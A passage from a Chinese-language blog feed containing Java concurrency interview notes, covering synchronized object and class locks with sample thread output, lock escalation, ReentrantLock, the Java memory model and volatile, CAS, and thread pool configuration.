System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncClassBlock1_Start: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncClassBlock1_End: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">syncClassMethod1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncClassMethod1: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncClassMethod1_Start: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncClassMethod1_End: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行 A B C</p><p><img src="image-20200406094654012.png" alt></p><p>结果如下： </p><p><strong><font color="orange">A_thread2_Async_Start: 10:53:42</font></strong></p><p><strong><font color="blue">B_thread2_SyncObjectBlock1: 10:53:42</font></strong></p><p><strong>C_thread1_SyncObjectMethod1: 10:53:42</strong></p><p><strong><font color="blue">B_thread1_SyncObjectBlock1: 10:53:42</font></strong></p><p><strong><font color="orange">A_thread1_Async_Start: 10:53:42</font></strong></p><p><strong>C_thread1_SyncObjectMethod1_Start: 10:53:42</strong></p><p><strong><font color="orange">A_thread2_Async_End: 10:53:43</font></strong></p><p><strong><font color="orange">A_thread1_Async_End: 10:53:43</font></strong></p><p><strong>C_thread1_SyncObjectMethod1_End: 10:53:43</strong></p><p><strong><font color="blue">B_thread1_SyncObjectBlock1_Start: 10:53:43</font></strong></p><p><strong><font color="blue">B_thread1_SyncObjectBlock1_End: 10:53:44</font></strong></p><p><strong><font color="blue">B_thread2_SyncObjectBlock1_Start: 10:53:44</font></strong></p><p><strong><font color="blue">B_thread2_SyncObjectBlock1_End: 10:53:45</font></strong></p><p><strong>C_thread2_SyncObjectMethod1: 10:53:45</strong></p><p><strong>C_thread2_SyncObjectMethod1_Start: 10:53:45</strong></p><p><strong>C_thread2_SyncObjectMethod1_End: 10:53:46</strong></p><p>我们分开来看</p><p><strong><font color="orange">A_thread想怎么样就怎么样，因为是异步的。1可能后于2执行但是先于2结束。</font></strong></p><p><strong><font color="blue">B_thread在进入同步块之前和A_thread行为一样，进入后谁先抢占锁谁先执行。</font></strong></p><p><strong>C_thread因为使用synchronized修饰方法，因此一开始就是同步方法。</strong></p><p>然后再合起来看：</p><p>发现线程C和线程B也是同步的，因为synchronized的变量是一样的。</p><p>同步方法和同步块锁的都是同一个对象。</p><p>如果换成不同对象呢？</p><p><img src="image-20200406095434194.png" alt></p><p><font color="blue"><strong>B_thread2_SyncObjectBlock1: 11:05:52</strong></font></p><p><font color="blue"><strong>B_thread1_SyncObjectBlock1: 11:05:52</strong></font></p><p><strong>C_thread1_SyncObjectMethod1: 11:05:52</strong></p><p><strong>C_thread1_SyncObjectMethod1_Start: 11:05:52</strong></p><p><strong><font color="blue">B_thread2_SyncObjectBlock1_Start: 11:05:52</font></strong></p><p><strong>C_thread1_SyncObjectMethod1_End: 11:05:53</strong></p><p><strong>C_thread2_SyncObjectMethod1: 11:05:53</strong></p><p><strong>C_thread2_SyncObjectMethod1_Start: 11:05:53</strong></p><p><strong><font color="blue">B_thread2_SyncObjectBlock1_End: 11:05:53</font></strong></p><p><strong><font color="blue">B_thread1_SyncObjectBlock1_Start: 11:05:53</font></strong></p><p><strong><font color="blue">B_thread1_SyncObjectBlock1_End: 11:05:54</font></strong></p><p><strong>C_thread2_SyncObjectMethod1_End: 11:05:54</strong></p><p>明显看到和上面最大的差别就是B和C变成异步的了。</p><p><img src="image-20200406095626317.png" alt></p><p><strong><font color="blue">D_thread2_SyncClassBlock1: 11:17:10</font></strong></p><p><strong><font color="orange">A_thread1_Async_Start: 11:17:10</font></strong></p><p><strong><font color="blue">D_thread1_SyncClassBlock1: 11:17:10</font></strong></p><p><strong>E_thread1_SyncClassMethod1: 11:17:10</strong></p><p><strong><font color="orange">A_thread2_Async_Start: 11:17:10</font></strong></p><p><strong>E_thread1_SyncClassMethod1_Start: 11:17:10</strong></p><p><strong><font color="orange">A_thread2_Async_End: 11:17:11</font></strong></p><p><strong>E_thread1_SyncClassMethod1_End: 11:17:11</strong></p><p><font color="orange"><strong>D_thread1_SyncClassBlock1: 11:17:10A_thread1_Async_End: 11:17:11</strong></font></p><p><strong><font color="blue">D_thread1_SyncClassBlock1_Start: 11:17:11</font></strong></p><p><strong><font color="blue">D_thread1_SyncClassBlock1_End: 11:17:12</font></strong></p><p><strong><font color="blue">D_thread2_SyncClassBlock1_Start: 11:17:12</font></strong></p><p><strong><font color="blue">D_thread2_SyncClassBlock1_End: 11:17:13</font></strong></p><p><strong>E_thread2_SyncClassMethod1: 11:17:13</strong></p><p><strong>E_thread2_SyncClassMethod1_Start: 11:17:13</strong></p><p><strong>E_thread2_SyncClassMethod1_End: 11:17:14</strong></p><p>其实和第一次的结果一致，同时注意一个细节就是类锁不干扰对象锁。</p><p><img src="image-20200406095920294.png" alt></p><p><font color="red"><strong>类锁和对象锁是互不干扰的</strong></font></p><h4><span id="对象锁和类锁的总结">对象锁和类锁的总结</span></h4><ol><li><p>有线程访问对象的同步代码块时，另外的线程可以访问该对象的非同步代码块；</p></li><li><p>若锁住的是同一对象，一个线程在访问对象的同步代码块时，另一个访问对象的同步代码块的线程会被阻塞；</p></li><li><p>若锁住的是同一个对象，一个线程在访问对象的同步方法时，另一个访问对象同步方法的线程会被阻塞；</p></li><li><p>若锁住的是同一个对象，一个线程在访问对象的同步代码块时，另一个访问对象同步方法的线程会被阻塞，反之亦然；</p></li><li><p>同一个类的不同对象的对象锁互不干扰；</p></li><li><p>类锁由于也是一种特殊的对象锁，因此表现和上述1,2,3,4一致，而由于一个类只有一把对象锁，所以<font color="orange">同一个类</font>的<font color="red">不同对象使用类锁</font>将会是同步的；</p></li><li><p>类锁和对象锁互不干扰</p></li></ol><p><strong><font color="red">一个是类对象，一个是对象。</font></strong></p><h2><span id="对象在内存中的布局">对象在内存中的布局</span></h2><p>Ø 对象头</p><p>Ø 实例数据</p><p>Ø 对齐填充</p><h3><span id="对象头的结构">对象头的结构</span></h3><p><img src="image-20200406100050928.png" alt></p><h3><span id="mark-word">Mark Word</span></h3><p><img src="image-20200406100106418.png" alt></p><h2><span id="monitor每个java对象天生自带了一把看不见的锁c实现">Monitor：每个Java对象天生自带了一把看不见的锁（C++实现）</span></h2><p><img src="image-20200406100119993.png" alt></p><p><img src="image-20200406100127154.png" alt></p><p>我们可以看到同步代码块执行的是monitorenter和monitorexit指令</p><h2><span id="什么是从重入">什么是从重入</span></h2><p>从互斥锁的设计上来说，当一个线程试图操作一个由其他线程持有的对象锁的临界资源时，将会处于阻塞状态，但当一个线程<font color="orange"><strong>再次请求自己持有对象锁的临界资源时</strong></font>，这种情况属于重入。</p><h2><span id="为什么会对synchronized嗤之以鼻">为什么会对synchronized嗤之以鼻</span></h2><p>Ø 早期版本，synchronized属于重量级锁，依赖于Mutex Lock实现</p><p>Ø 线程之间的切换需要从<font color="orange">用户态转换到核心态</font>，开销较大。</p><h2><span id="java6以后synchronized性能得到了很大的提升">Java6以后，synchronized性能得到了很大的提升</span></h2><table><thead><tr><th>Adaptive Spinning</th><th align="center">Lightweight Locking</th></tr></thead><tbody><tr><td>Lock Eliminate</td><td align="center">Biased Locking</td></tr><tr><td>Lock Coarsening</td><td align="center">…</td></tr></tbody></table><h2><span id="自旋锁与自适应自旋锁">自旋锁与自适应自旋锁</span></h2><h3><span id="自旋锁">自旋锁</span></h3><p>Ø 许多情况下，共享数据的锁定状态持续时间较短，切换线程不值得</p><p>Ø 通过让线程执行忙循环等待锁的释放，不让出CPU</p><p>Ø 缺点：若锁被其它线程长时间占用，会带来许多性能上的开销</p><p>jvm调优可以用-XX:preBlockSpin</p><h3><span id="自适应自旋锁">自适应自旋锁</span></h3><p>Ø 自旋的次数不再固定</p><p>Ø 由前一次在同一个锁上的自旋时间及锁的拥有者的状态来决定</p><h2><span id="锁消除">锁消除</span></h2><h3><span id="更彻底的优化">更彻底的优化</span></h3><p>Ø JIT编译时，对运行上下文进行扫描，去除不可能存在竞争的锁。</p><p><img src="image-20200406102305792.png" alt></p><p>自动消除这个synchronized锁，因为sb属于本地变量并没有return出去，因此不存在被其他线程引用到的风险，因此会自动取消synchronized</p><p><img src="image-20200406102315172.png" alt></p><h2><span id="锁粗化">锁粗化</span></h2><h3><span id="另一种极端">另一种极端</span></h3><p>通过扩大锁的范围，避免重复加锁和解锁</p><p><img src="image-20200406102342630.png" alt></p><p>因为是在循环内部加解锁，虽然可能存在同步竞争，但是在线程内部其实是没有同步竞争的，因此JVM会将锁加到方法上，而不是一个append操作里面。</p><h2><span id="synchronized的四种状态">Synchronized的四种状态</span></h2><p>Ø 无锁、偏向锁、轻量级锁、重量级锁</p><p><strong>锁膨胀方向：无锁→偏向锁→轻量级锁→重量级锁</strong></p><h3><span id="偏向锁减少同一线程获取锁的代价-cascompare-and-swap-">偏向锁：减少同一线程获取锁的代价 CAS（Compare and Swap）【-】</span></h3><p>Ø 大多数情况下，锁不存在多线程竞争，总是由同一线程多次获得</p><p><strong>核心思想：</strong></p><p>如果一个线程获得了锁，<font color="orange">在Mark Word中CAS记录owner，<em>如果成功。</em>那么锁就进入偏向模式，此时Mark Word的结构也变为偏向锁结构</font>，当该线程再次请求锁时，无需再做任何同步操作，即获取锁的过程只需要<font color="orange">检查Mark Word的锁标记位为偏向锁以及当前线程Id等于Mark Word的ThreadID即可</font>，这样就省去了大量有关锁申请的操作。</p><p>如果测试失败，则需要再测试一下Mark Word中偏向锁的标识是否设置成1（表示当前是偏向锁）：如果没有设置，则使用CAS竞争锁；如果设置了，则尝试使用CAS将对象头的偏向锁指向当前线程</p><p>不适用于锁竞争比较激烈的多线程场合</p><h3><span id="轻量级锁">轻量级锁</span></h3><p>轻量级锁是由偏向锁升级来的，偏向锁运行在一个线程同步块的情况下，当第二个线程加入锁争用的时候，偏向锁就会升级为轻量级锁。 </p><p>适应的场景：线程<font color="orange">交替执行</font>同步块 </p><p>若存在同一时间访问同一锁的情况，就会导致轻量级锁膨胀为重量级锁</p><h4><span id="加锁过程">加锁过程</span></h4><p>（1）   在代码进入同步块的时候，如果同步对象锁状态为无锁状态（锁状态位为“01”状态），虚拟机首先将在当前线程的栈帧中建立一个名为锁记录（Lock Record）的空间。用于存储锁对象目前的Mark Word的拷贝，官方称之为Displaced Mark Word。这时候线程堆栈与对象头的状态如图所示。</p><p><img src="image-20200406102559772.png" alt>       </p><p>（2）   拷贝对象头中的Mark Word复制到锁记录中。</p><p>（3）   拷贝成功后，虚拟机将使用CAS操作尝试将对象的Mark Word更新为指向Lock Record的指针，并将Lock record里的owner指针指向Object mark word。如果更新成功，则执行步骤（4）否则执行步骤（5）。</p><p>（4）   如果这个更新动作成功了，那么这个线程就拥有了该对象的锁，并且对象Mark Word的锁标志位设置为“00”，即表示此对象处于轻量级锁定状态，这时候线程堆栈和对象头的状态如图所示。</p><p> <img src="image-20200406102622997.png" alt></p><p>（5）   如果这个更新操作失败了，虚拟机首先会检查对象的Mark Word是否指向当前线程的栈帧，如果是就说明当前线程已经拥有了这个对象的锁，那就可以直接进入同步块继续执行。否则说明多个线程竞争锁，轻量级锁就要膨胀为重量级锁，锁标志的状态值变为“10”，Mark Word中存储的就是指向重量级锁（互斥量）的指针，后面等待锁的过程也要进入阻塞状态。而当前线程便尝试使用自旋来获取锁，自旋之前讲过，就是不让线程阻塞，而采用循环去获取锁的过程。 </p><h4><span id="解锁过程">解锁过程</span></h4><p>（1）   通过CAS操作尝试把线程中复制的Displaced Mark Word对象替换当前的Mark Word。</p><p>（2）   如果替换成功，整个同步过程就完成了。</p><p>（3）   如果替换失败，说明有其他线程尝试过获取该锁（此时锁已膨胀），那就要在释放锁的同时，唤醒被挂起的线程。</p><p><strong>加锁</strong></p><p>线程在执行同步块之前，JVM会先在当前线程的栈桢中<strong>创建用于存储锁记录的空间</strong>，并将对象头中的Mark Word复制到锁记录中，官方称为<strong>Displaced Mark Word</strong>。然后线程尝试使用CAS<strong>将对象头中的Mark Word替换为指向锁记录的指针</strong>。如果成功，当前线程获得锁，如果失败，表示其他线程竞争锁，当前线程便尝试使用自旋来获取锁。</p><p><strong>解锁</strong></p><p>轻量级解锁时，会使用原子的CAS操作将Displaced Mark Word替换回到对象头，如果成功，则表示没有竞争发生。如果失败，表示当前锁存在竞争，锁就会膨胀成重量级锁。</p><h2><span id="锁的内存语义">锁的内存语义</span></h2><p>当线程释放锁时，Java内存模型会把该线程对应的本地内存中的共享变量刷新到主内存中；</p><p>而当线程获取锁时，Java内存模型会把该线程对应的本地内存置为无效，从而使得被监控器保护的临界区代码必须从主内存中读取共享变量。</p><p><img src="image-20200406102705063.png" alt></p><h2><span id="偏向锁-轻量级锁-重量级锁的汇总">偏向锁、轻量级锁、重量级锁的汇总</span></h2><p><img src="image-20200406102715189.png" alt></p><h2><span id="synchronized和reentrantlock">Synchronized和ReentrantLock</span></h2><h3><span id="reentrantlock再入锁">ReentrantLock（再入锁）</span></h3><p>Ø 位于java.util.concurrent.locks包</p><p>Ø 和CountDownLatch、FutureTask、Semaphore一样基于AQS实现</p><p>Ø 能够比synchronized更细粒度的控制，如控制fairness</p><p>Ø 调用lock（）之后，必须调用unlock（）释放锁</p><p>Ø 性能未必比synchronized高，并且也是可重入的</p><h4><span id="reentrantlock公平性的设置">ReentrantLock公平性的设置</span></h4><p>Ø ReentrantLock fairLock = new ReentrantLock（true）；</p><p>Ø 参数为true时，倾向于将锁赋予等待时间最久的线程</p><p>Ø 公平锁：获取锁的顺序按先后调用lock方法的顺序（慎用）</p><p>Ø 非公平锁：抢占顺序不一定，看运气</p><p>Ø Synchronized是非公平锁</p><p> <img src="image-20200406102742724.png" alt></p><p><img src="image-20200406102748852.png" alt></p><h4><span id="reentrantlock将锁对象化">ReentrantLock将锁对象化</span></h4><p>Ø 判断是否有线程，或者某个特定线程，在排队等待获取锁</p><p>Ø 带超时的获取锁的尝试</p><p>Ø 感知有没有成功获取锁</p><h4><span id="能将waitnotifynotifyall对象化">能将wait\notify\notifyAll对象化</span></h4><p>Ø Java.util.concurrent.locks.Condition</p><h4><span id="synchronized和reentrantlock的区别总结">Synchronized和ReentrantLock的区别总结</span></h4><p>Ø Synchronized是关键字，ReentrantLock是类</p><p>Ø ReentrantLock可以对获取锁的等待时间进行设置，避免死锁</p><p>Ø ReetrantLock可以获取各种锁的信息</p><p>Ø ReentrantLock可以灵活地实现多路通知</p><p>Ø <font color="red">机制：sync操作Mark Word，lock调用Unsafe类的park（）方法</font></p><h2><span id="什么是java内存模型中的happens-before">什么是Java内存模型中的happens-before</span></h2><h3><span id="java内存模型jmm">Java内存模型JMM</span></h3><p>JMM描述的是一组规则，围绕原子性，有序性、可见性展开，定义了程序中<font color="red">各个变量的访问方式</font> </p><p>JMM处于中间层，包含了两个方面：（1）内存模型；（2）重排序以及happens-before规则。同时，为了禁止特定类型的重排序会对编译器和处理器指令序列加以控制。</p><p><img src="image-20200406102842448.png" alt></p><h3><span id="jmm中的主内存">JMM中的主内存</span></h3><p>Ø 存储Java实例对象</p><p>Ø 包括成员变量、类信息、常量、静态变量等</p><p>Ø 属于数据共享的区域，多线程并发操作时会引发线程安全问题</p><h3><span id="jmm中的工作内存">JMM中的工作内存</span></h3><p>Ø 存储当前方法的所有本地变量信息，本地变量对其他线程不可见</p><p>Ø 字节码行号指示器、Native方法信息</p><p>Ø 属于线程私有数据区域，不存在线程安全问题</p><h3><span id="jmm与java内存区域划分是不同的概念层次">JMM与Java内存区域划分是不同的概念层次</span></h3><p>Ø JMM描述的是一组规则，围绕原子性，有序性、可见性展开</p><p>Ø 相似点：存在共享区域和私有区域</p><h3><span id="主内存与工作内存的数据存储类型以及操作方式归纳">主内存与工作内存的数据存储类型以及操作方式归纳</span></h3><p>Ø 方法里的基本数据类型本地变量将直接存储在工作内存的栈帧结构中</p><p>Ø 引用类型的本地变量：引用储存在工作内存中，实例储存在主内存中</p><p>Ø 成员变量、static变量、类信息均会被存储在主内存中</p><p>Ø 主内存共享的方式是线程各拷贝一份数据到工作内存，操作完成后刷新回主内存</p><p><img src="image-20200406103124125.png" alt></p><h3><span id="指令重排序需要满足的条件">指令重排序需要满足的条件</span></h3><p>Ø 在单线程环境下不能改变程序运行的结果</p><p>Ø 存在数据依赖关系的不允许重排列</p><p><strong>无法通过happens-before原则推导出来的，才能进行指令的重排序</strong></p><h4><span id="a操作的结果需要对b操作可见则a与b存在happens-before关系">A操作的结果需要对B操作可见，则A与B存在happens-before关系</span></h4><p><img src="image-20200406103135759.png" alt></p><h4><span id="happens-before的八大原则">Happens-before的八大原则</span></h4><ol><li><strong>程序次序规则</strong>：一个线程内，按照代码顺序，书写在前面的操作先行发生于书写在后面的操作；</li><li><strong>锁定规则</strong>：一个unLock操作先行发生于后面对同一个锁的lock操作；</li><li><strong>Volatile变量规则</strong>：对一个变量的写操作先行发生于后面对这个变量的读操作；</li><li><strong>传递规则</strong>：如果操作A发生先行于操作B，而操作B又先行发生于操作C，则可以得出操作A先行发生于操作C</li><li><strong>线程启动规则</strong>：Thread对象的start（）方法先行发生于此线程的每一个动作；</li><li><strong>线程中断规则</strong>：对线程interrupt（）方法的调用先行于被中断线程的代码检测到中断事件的发生</li><li><strong>线程终结规则</strong>：线程中所有操作都先行于线程的终止检测，我们可以通过Thread.join（） 方法结束，Thread.isAlive()的返回值手段检测线程已经终止执行；</li><li><strong>对象终结规则</strong>：一个对象的初始化完成先行发生于他的finalize（）方法的开始；</li></ol><h4><span id="happens-before的概念">Happens-before的概念</span></h4><p>如果两个操作不满足上述任意一个happens-before规则，那么这两个操作就没有顺序的保障，JVM可以对这两个操作进行重排序；</p><p>如果操作A happens-before操作B，那么操作A在内存上所做的操作对操作B都是可见的。 </p><p><img src="image-20200406103324765.png" alt></p><p>无法通过happens-before原则推导出（因此不是线程安全的）</p><p>可以对方法加入synchronized锁或者对变量进行volatile修饰。 </p><h4><span id="final重排序">final重排序</span></h4><p>按照final修饰的数据类型分类：</p><p>基本数据类型:</p><ol><li>final域写：禁止<strong>final</strong>域写<strong>与</strong>构造方法重排序，即禁止final域写重排序到构造方法之外，从而保证该对象对所有线程可见时，该对象的final域全部已经初始化过。</li><li>final域读：禁止初次<strong>读对象的引用</strong>与<strong>读该对象包含的</strong>final域的重排序。</li></ol><p>引用数据类型：</p><p>额外增加约束：禁止在构造函数对<strong>一个</strong>final修饰的对象的成员域的写入<strong>与随后将</strong>这个被构造的对象的引用赋值给引用变量重排序</p><h4><span id="volatilejvm提供的轻量级同步机制">Volatile：JVM提供的轻量级同步机制</span></h4><p>Ø 保证被volatile修饰的共享变量对所有线程总是可见的</p><p>Ø 禁止指令重排序优化</p><h4><span id="volatile不保证原子性">Volatile不保证原子性</span></h4><p><img src="image-20200406103421551.png" alt></p><p>会产生线程安全问题，因为++不是原子性操作 </p><p>因此要用synchronized修饰符，并且volatile可以被省略。</p><p><img src="image-20200406103433641.png" alt></p><p>由于对boolean值shutdown修改是原子性操作，因此可以保证线程安全。</p><p><img src="image-20200406103441676.png" alt></p><h4><span id="volatile变量为何立即可见">Volatile变量为何立即可见？</span></h4><p>当写一个volatile变量时，JMM会把该线程对应的工作内存中的共享变量值刷新到主内存中；</p><p>当读取一个volatile变量时，JMM会把该线程对应的工作内存置为无效。</p><h4><span id="volatile如何禁止重排优化">Volatile如何禁止重排优化</span></h4><p>内存屏障（Memory Barrier）</p><ol><li><p>保证特定操作的执行顺序</p></li><li><p>保证某些变量的内存可见性</p></li></ol><p>通过插入内存屏障指令禁止在内存屏障前后的指令执行重排序优化</p><p>强制刷出各种CPU的缓存数据，因此任何CPU上的线程都能读取到这些数据的最新版本 </p><h4><span id="实现线程安全的单例写法错误示范">实现线程安全的单例写法（错误示范）</span></h4><p><img src="image-20200406103504191.png" alt></p><p>因为步骤2和步骤3不存在数据依赖关系，所以可能被重排序。</p><p>重排序只会保证单线程的语义一致性（串行语义的一致性），不会保证多线程之间的语义一致性。</p><p>因此本例可能会出现线程1重排序后执行到第2步时已经将instance指向了分配的内存，导致线程2返回instance。</p><p><font color="orange"><strong>解决方法：使用volatile修饰instance即可。</strong></font></p><p><img src="image-20200406103549743.png" alt></p><h4><span id="volatile和synchronized的区别">Volatile和synchronized的区别</span></h4><ol><li><p>Volatile本质是在告诉JVM当前变量在寄存器（工作内存）中的值是不确定的，需要从主存中读取；synchronized则是锁定当前变量，只有当前线程可以访问该变量，其他线程被阻塞住直到该线程完成变量操作为止</p></li><li><p>Volatile仅能使用在变量级别；synchronized则可以使用在变量、方法和类级别</p></li><li><p>Volatile仅能实现变量的修改可见性，不能保证原子性；而synchronized则可以保证变量修改的可见性和原子性</p></li><li><p>Volatile不会造成线程的阻塞；synchronized可能会造成线程的阻塞</p></li><li><p>Volatile标记的变量不会被编译器优化；synchronized标记的变量可以被编译器优化</p></li></ol><h2><span id="cascompare-and-swap">CAS（compare and swap）</span></h2><h3><span id="乐观锁和悲观锁">乐观锁和悲观锁</span></h3><p>Synchronized这种独占锁属于悲观锁，悲观锁始终假定会发生并发冲突，因此会屏蔽一切可能会违反数据完整性的操作，除此之外还有乐观锁，它假设不会发生并发冲突，因此只在提交时检查是否违反数据完整性，如果提交失败则会重试 </p><h3><span id="一种高效实现线程安全性的方法">一种高效实现线程安全性的方法</span></h3><p>Ø 支持原子更新操作，适用于计数器，序列发生器等场景</p><p>Ø 属于乐观锁机制，号称lock-free</p><p>Ø CAS操作失败时由开发者决定是继续尝试，还是执行别的操作</p><p>内存位置的值即为主内存里面的值。</p><h3><span id="cas思想">CAS思想</span></h3><p>包含三个操作数——内存位置（V）、预期原值（A）和新值（B） </p><p>不断失败重试，直到成功为止。</p><p> <img src="image-20200406103630627.png" alt></p><p><img src="image-20200406103636135.png" alt></p><p>我们发现value++被拆分成如下的指令</p><p>得到值、操作加一、写回值</p><p><img src="image-20200406103647421.png" alt></p><p>可以使用synchronized修饰符修饰解决原子性操作问题，但是效率不高。</p><p>我们可以使用AtomicInteger来解决。</p><p><img src="image-20200406103657100.png" alt></p><p><img src="image-20200406103701526.png" alt></p><p><strong><font color="orange">每次从内存中读取数据然后将此数据和+1后的结果进行CAS操作，如果成功就返回结果，否则重试直到成功为止。</font></strong></p><p><font color="red">CAS有3个操作数，内存值V，旧的预期值A，要修改的新值B。当且仅当预期值A和内存值V相同时，将内存值V修改为B，否则什么都不做。</font></p><p>CAS的原子性实际上是CPU实现</p><h3><span id="cas多数情况下对开发者来说是透明的">CAS多数情况下对开发者来说是透明的</span></h3><p>Ø J.U.C的atomic包提供了常用的原子性数据类型以及引用、数组等相关原子类型和更新操作工具，是很多线程安全程序的首选</p><p>Ø Unsafe类虽然提供CAS服务，但因能够操纵任意内存地址读写而有隐患</p><p>Ø Java9以后，可以使用Variable Handle API来替代Unsafe </p><h3><span id="缺点">缺点</span></h3><p>Ø 若循环时间长，则开销很大</p><p>Ø 只能保证一个共享变量的原子操作</p><p>Ø ABA问题  解决：AtomicStampedReference</p><p>ABA的意思是，A的值被改成B又被改成A了然后cas没办法感知它的变化，以为它一直是A。</p><h2><span id="java线程池">Java线程池</span></h2><h3><span id="利用executors创建不同的线程池满足不同场景的需求">利用Executors创建不同的线程池满足不同场景的需求</span></h3><ol><li><p>newFixedThreadPool（int nThreads）指定工作线程数量的线程池</p></li><li><p>newCachedThreadPool() 处理大量短时间工作任务的线程池，</p></li></ol><p>（1）   试图缓存线程并重用，当无缓存线程可用时，就会创建新的工作线程；</p><p>（2）   如果线程闲置的时间超过阈值，则会被终止并移除缓存；</p><p>（3）   系统长时间闲置的时候，不会消耗什么资源</p><ol start="3"><li><p>newSingleThreadExcutor（）创建唯一的工作者线程来执行任务，如果线程异常结束，会有另一个线程取代它</p></li><li><p>newSingleThreadScheduledExecutor（）与newScheduledThreadPool（int corePoolSize）定时或者周期性的工作调度，两者的区别在于单一工作线程还是多个线程</p></li><li><p>newWorkStealingPool（）</p><p>内部会构建ForkJoinPool，利用working-stealing算法，并行地处理任务，不保证处理顺序</p></li></ol><h3><span id="forkjoin框架">Fork/Join框架</span></h3><p>Work-Stealing算法：某个线程从其他队列里窃取任务来执行 </p><p>Ø 把大任务分割成若干个小任务并行执行，最终汇总每个小任务结果后得到大任务结果的框架</p><p><img src="image-20200406103916611.png" alt></p><p>可能会出现有些线程的任务队列已经完成了，但其它线程的队列还有任务没有完成，主要会造成已完成任务的线程会被闲置，为了提高效率，已经完成任务的线程会从未完成任务线程的队列里面窃取任务。为了减少任务窃取线程和被窃取线程之间的竞争通常会使用双端队列。被窃取任务线程永远从双端队列的头部拿任务执行，而窃取任务线程永远从双端队列的尾部拿任务执行。</p><h3><span id="为什么要使用线程池">为什么要使用线程池</span></h3><p>Ø 降低资源消耗</p><p>Ø 提高线程的可管理性 </p><h3><span id="executor的框架">Executor的框架</span></h3><p><img src="image-20200406103937736.png" alt></p><h3><span id="juc的三个executor接口">J.U.C的三个Executor接口</span></h3><p>Ø Executor：运行新任务的简单接口，将任务提交和任务操作细节解耦</p><p><img src="image-20200406103950097.png" alt></p><p>Ø ExecutorService：具备管理执行器和任务生命周期的方法，提交任务机制更完善</p><p>Ø ScheduledExecutorService：支持Future和定期执行任务   </p><p><img src="image-20200406103956689.png" alt></p><h3><span id="threadpoolexecutor的构造函数">ThreadPoolExecutor的构造函数</span></h3><p>Ø corePoolSize：核心线程数量</p><p>Ø maximumPoolSize:线程不够用时能够创建的最大线程数</p><p>Ø workQueue：任务等待队列</p><p>Ø keepAliveTime：抢占的顺序不一定，看运气</p><p>Ø threadFactory：创建新线程，Executors.defaultThreadFactory()</p><h3><span id="threadpooleecutor">ThreadPoolEecutor</span></h3><p><img src="image-20200406104018426.png" alt></p><h3><span id="handler线程池的饱和策略">Handler:线程池的饱和策略</span></h3><p>Ø AbortPolicy：直接抛出异常，这是默认策略</p><p>Ø CallerRunsPolicy：用调用者所在的线程来执行任务</p><p>Ø DiscardOldestPolicy：丢弃队列中靠最前的任务，并执行当前任务</p><p>Ø DiscardPolicy：直接丢弃任务</p><p>Ø 实现RejectedExecutionHandler接口的自定义handler</p><h3><span id="新任务提交execute执行后的判断">新任务提交execute执行后的判断</span></h3><p>Ø 如果运行的线程少于corePoolSize，则创建新线程来处理任务，即使线程池中的其他线程是空闲的；</p><p>Ø 如果线程池中的线程数量大于等于corePoolSize且小于maximumPoolSize，则只有当workQueue满时才创建新的线程去处理任务；</p><p>Ø 如果设置的corePoolSize和maximumPoolSize相同，则创建的线程池的大小是固定的，这时如果有新任务提交，若workQueue未满，则将请求放入workQueue中，等待有空闲的线程去从workQueue中取任务并处理；</p><p>Ø 如果运行的线程数量大于等于maximumPoolSize，这时如果workQueue已经满了，则通过handler所指定的策略来处理任务；</p><p><img src="image-20200406104034547.png" alt></p><p><img src="image-20200406104040637.png" alt></p><p>Ctl：状态值和有效线程数。</p><p>高3位run state</p><p>剩下29位保存work account</p><h3><span id="线程池的状态">线程池的状态</span></h3><p>Ø RUNNING:能接受新提交的任务，并且也能处理阻塞队列中的任务</p><p>Ø SHUTDOWN:不再接受新提交的任务，但可以处理存量任务</p><p>Ø STOP：不再接受新提交的任务，也不处理存量任务</p><p>Ø TIDYING：所有的任务都已终止</p><p>Ø TERMINATED：terminated（）方法执行完后进入该状态</p><p><img src="image-20200406104105572.png" alt></p><h3><span id="工作线程的生命周期">工作线程的生命周期</span></h3><p><img src="image-20200406104115334.png" alt></p><h3><span id="线程池的大小如何选定">线程池的大小如何选定</span></h3><p>Ø CPU密集型：线程数=按照核数或者核数+1设定</p><p>Ø I/O密集型：线程数=CPU核数*(1+平均等待时间/平均工作时间)</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java线程知识考点</title>
      <link href="/2020/04/05/java-Thread/"/>
      <url>/2020/04/05/java-Thread/</url>
      
